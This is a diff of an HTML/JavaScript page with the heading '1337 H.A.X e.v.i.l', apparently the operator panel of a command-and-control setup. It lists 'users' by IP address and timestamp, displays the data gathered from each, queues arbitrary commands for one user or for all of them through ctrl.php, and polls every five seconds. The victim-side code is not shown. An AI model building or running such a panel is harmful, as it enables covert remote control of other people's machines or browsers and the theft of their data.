@@ -3,10 +3,55 @@
 		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
 		<title>Control Tool</title>
 		<style>
+
+table, tr, td {
+	border: 0;
+}
+body {
+	background-color: #000;
+	color: #fff;
+	font-family: monospace;
+	font-size: 15px;
+}
 textarea {
 	display: block;
 	width: 100%;
+	background-color: #222;
+	color: #fff;
+}
+button {
+}
+table button {
+	width: 120px;
+}
+.highlight {
+	background-color: #380;
+}
+.refresh {
+	margin-bottom: 10px;
+	width: 100%;
+}
+#users {
+	margin-bottom: 10px;
+}
+#cmd {
+	min-height: 200px;
+}
+#data {
+	width: 49%;
+	min-height: 250px;
+	float: left;
+}
+#cmds {
+	width: 49%;
+	min-height: 250px;
+	float: right;
+}
+#log {
 	min-height: 150px;
+}
+.clear {
+	clear: both;
 }
 		</style>
 		<script src="jquery-2.1.3.min.js"></script>
@@ -15,19 +60,25 @@ textarea {
 var ctrl = 'ctrl.php';
 
 var l_users = [];
+var l_times = [];
 var l_selected = -1;
 
 var $selected_user = null;
 var $users = null;
 var $cmd = null;
+var $cmds = null;
 var $data = null;
 var $log = null;
+var $run_selected = null;
 
 function log(msg) {
 	$log.get(0).value += msg + '\n';
 	$log.scrollTop($log[0].scrollHeight);
 }
 function refresh_users() {
+
+	select_user(-1);
+
 	$.ajax({
 		type: 'POST',
 		url: ctrl,
@@ -36,11 +87,20 @@ function refresh_users() {
 		data: {req : 'get_users'}
 	})
 	.done(function(data) {
-		l_users = data;
+		l_users = [];
+		l_times = [];
 		$users.empty();
-		for (var i = 0; i < l_users.length; i++) {
+		for (var i = 0; i < data.length; i++) {
+			l_users.push(data[i][0]);
+			l_times.push(data[i][1]);
 			$users.append($('<tr></tr>')
-				.append('<td><button onclick="select_user('+i+')">' + l_users[i] + '</button></td>'));
+				.append('<td><button onclick="select_user('+i+');">' + l_users[i] + '</button></td>')
+				.append('<td>' + l_times[i] + '</td>')
+				//.append('<td><button onclick="get_data('+i+')">Show Data</button></td>')
+				//.append('<td><button onclick="view_cmds('+i+')">View Commands</button></td>')
+				.append('<td><button onclick="clear_cmds('+i+')">Clear Commands</button></td>')
+				.append('<td><button onclick="clear_data('+i+')">Clear Data</button></td>')
+				.append('<td><button onclick="del_data('+i+')">Delete User</button></td>'));
 		}
 		log('Fetched ' + l_users.length + ' IP addresses.');
 	});
@@ -48,44 +108,84 @@ function refresh_users() {
 
 function select_user(index) {
 	l_selected = index;
-	if (index < 0) {
-		$selected_user.html('Selected: ALL');
-	} else {
-		$selected_user.html('Selected: ' + l_users[index]);
-	}
-}
-function get_data() {
-	if (l_selected < 0) {
-		$data.val('Select user first.');
-		return;
-	}
 	
-	$.ajax({
-		type: 'POST',
-		url: ctrl,
-		cache: false,
-		dataType: 'text',
-		data: {req : 'get_data', user: l_users[l_selected]}
-	})
-	.done(function(data) {
-		$data.val(data);
-		log('Fetched data for ' + l_users[l_selected]);
-	});
-}
-function clear_data() {
-	$.ajax({
-		type: 'POST',
-		url: ctrl,
-		cache: false,
-		dataType: 'text',
-		data: {req : 'clear_data', user: l_users[l_selected]}
-	})
-	.done(function(data) {
+	$users.find('tr').removeClass('highlight');
+	
+	if (index >= 0) {
+		$users.find('tr').eq(index).addClass('highlight');
+		$run_selected.text('Add for ' + l_users[index]).removeAttr('disabled');
+		get_data(index);
+		view_cmds(index);
+	} else {
+		$run_selected.attr('disabled', 'disabled');
 		$data.val('');
-		log('Cleared data for ' + l_users[l_selected]);
+		$cmds.val('');
+	}
+}
+function get_data(index) {
+	generic_request(index, 'get_data', function(data) {
+		$data.val(data);
+		$data.scrollTop($data[0].scrollHeight);
+		log('Fetched data for ' + l_users[index]);
 	});
 }
-function run() {
+function clear_data(index) {
+	generic_request(index, 'clear_data', function(data) {
+		log('Cleared data for ' + l_users[index]);
+		if (l_selected == index) {
+			$data.val('');
+		}
+	});
+}
+function view_cmds(index) {
+	generic_request(index, 'get_cmd', function(data) {
+		$cmds.val(data);
+		$cmds.scrollTop($cmds[0].scrollHeight);
+		log('Fetched commands for ' + l_users[index]);
+	});
+}
+function clear_cmds(index) {
+	generic_request(index, 'clear_cmd', function(data) {
+		log('Cleared commands for ' + l_users[index]);
+		if (l_selected == index) {
+			$cmds.val('');
+		}
+	});
+}
+function del_data(index) {
+	if(!confirm('Are you sure?'))
+		return;
+
+	generic_request(index, 'del_data', function(data) {
+		log('Deleted data for ' + l_users[index]);
+		if (l_selected == index) {
+			$data.val('');
+			$cmds.val('');
+		}
+		refresh_users();
+	});
+}
+function generic_request(index, req, success) {
+	$.ajax({
+		type: 'POST',
+		url: ctrl,
+		cache: false,
+		dataType: 'text',
+		data: {req : req, user: l_users[index]}
+	})
+	.done(success);
+}
+function run_all() {
+	run(-1);
+}
+function run_selected() {
+	if (l_selected < 0) {
+		$data.val('No user selected.');
+	} else {
+		run(l_selected);
+	}
+}
+function run(index) {
 	var cmd = $cmd.val();
 	if (cmd.length == 0)
 		return;
@@ -93,10 +193,10 @@ function run() {
 	$cmd.val('');
 	
 	var data = null;
-	if (l_selected < 0) {
+	if (index < 0) {
 		data = {req : 'put_cmd_all', cmd: cmd};
 	} else {
-		data = {req : 'put_cmd', cmd: cmd, user: l_users[l_selected]};
+		data = {req : 'put_cmd', cmd: cmd, user: l_users[index]};
 	}
 	
 	$.ajax({
@@ -108,7 +208,7 @@ function run() {
 	})
 	.done(function(data) {
 		log('Executed command for '
-			+ (l_selected < 0 ? 'ALL' : l_users[l_selected])
+			+ (index < 0 ? 'ALL' : l_users[index])
 			+ '. ' + data);
 	});
 }
@@ -118,26 +218,36 @@ $(document).ready(function() {
 	$users = $('#users');
 	$cmd = $('#cmd');
 	$data = $('#data');
+	$cmds = $('#cmds');
 	$log = $('#log');
+	$run_selected = $('#run_selected');
 	
 	refresh_users();
-	select_user(-1);
+	
+	setInterval(function() {
+		if (l_selected >= 0) {
+			select_user(l_selected);
+		}
+	}, 5000);
 });
 
 		</script>
 	</head>
 	<body>
-		<button onclick="refresh_users()">Refresh Users</button>
-		<button onclick="select_user(-1)">Select All</button>
-		<div id="selected_user"></div>
+		<h1>1337 H.A.X e.v.i.l</h1>
+		<button class="refresh" onclick="refresh_users()">Refresh Users</button>
 		<table id="users"></table>
-		
+		<button class="refresh" onclick="refresh_users()">Refresh Users</button>
 		<textarea id="cmd"></textarea>
-		<button onclick="run()" onkeypress="">Run</button>
+		<button id="run_all" onclick="run_all()" onkeypress="">Add Command for ALL</button>
+		<button disabled="disabled" id="run_selected" onclick="run_selected()" onkeypress="">Add Command for...</button>
+		<br />
 		
+		<br class="clear" />
 		<textarea id="data" readonly="readonly"></textarea>
-		<button onclick="get_data()">Get data</button>
-		<button onclick="clear_data()">Clear data</button>
+		<textarea id="cmds" readonly="readonly"></textarea>
+		<br class="clear" />
+		<br />
 		
 		<textarea id="log" readonly="readonly"></textarea>
 	</body>
